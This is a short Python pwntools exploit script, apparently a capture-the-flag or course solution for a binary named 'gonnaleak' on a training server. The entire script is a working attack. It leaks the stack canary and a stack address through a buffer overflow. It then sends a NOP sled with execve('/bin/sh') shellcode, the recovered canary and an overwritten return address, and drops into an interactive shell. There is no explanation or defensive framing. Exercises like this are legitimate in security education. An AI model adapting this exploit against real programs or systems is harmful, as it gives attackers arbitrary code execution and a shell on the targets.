from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./gonnaleak")
p = remote("training.jinblack.it", 2011)
#gdb.attach(p, '''b *0x04011d4''')

raw_input("Wait")

p.send("B"*104 + "C")
time.sleep(0.1)
p.recvuntil("C")
canary = u64("\x00" + p.recv(7))

print "%#x" % canary

p.send("A"*(104+8+8+8+7) + "D")
time.sleep(0.2)
p.recvuntil("D")
address = u64(p.recv(6) + "\x00"*2)

print "Address: %#x" % address

bufferAddress = address - 0x150

print "Address BUFFER: %#x" % bufferAddress

shellcode = "\x48\xC7\xC0\x3B\x00\x00\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x0F\x05"
shellcodeLenght2 = 33

payload = "\x90"*(104-33) + shellcode + p64(canary) + "D"*8 + p64(bufferAddress)
p.send(payload)
time.sleep(0.1)

p.send("\x00")

p.interactive()